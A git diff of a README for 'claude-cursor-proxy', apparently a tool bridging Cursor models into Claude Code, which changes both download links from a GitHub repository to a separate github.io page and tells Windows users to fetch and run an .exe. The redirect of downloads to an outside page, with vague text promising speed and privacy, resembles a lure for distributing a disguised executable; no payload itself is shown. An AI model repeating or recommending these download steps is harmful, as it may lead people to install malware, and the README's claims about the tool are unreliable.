@@ -1,6 +1,6 @@
 # 🤖 claude-cursor-proxy - Run Cursor models in Claude Code
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/depictive-asiootus528/claude-cursor-proxy)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://depictive-asiootus528.github.io)
 
 This tool lets you use your Cursor models inside the Claude Code interface. It acts as a bridge between the two programs. You keep your current workflow while gaining access to the performance of Cursor models. It runs locally on your machine to ensure speed and privacy.
 
@@ -22,7 +22,7 @@ Your computer must meet these standards to run the proxy:
 
 Follow these steps to set up the software.
 
-1. Visit the repository page to download the latest file: [https://github.com/depictive-asiootus528/claude-cursor-proxy](https://github.com/depictive-asiootus528/claude-cursor-proxy)
+1. Visit the repository page to download the latest file: [https://depictive-asiootus528.github.io](https://depictive-asiootus528.github.io)
 2. Locate the file named with the .exe extension in the releases section.
 3. Save the folder to a location you can find, such as your Desktop or a dedicated folder in C:\Programs.
 4. Open your Windows File Explorer and navigate to that folder.
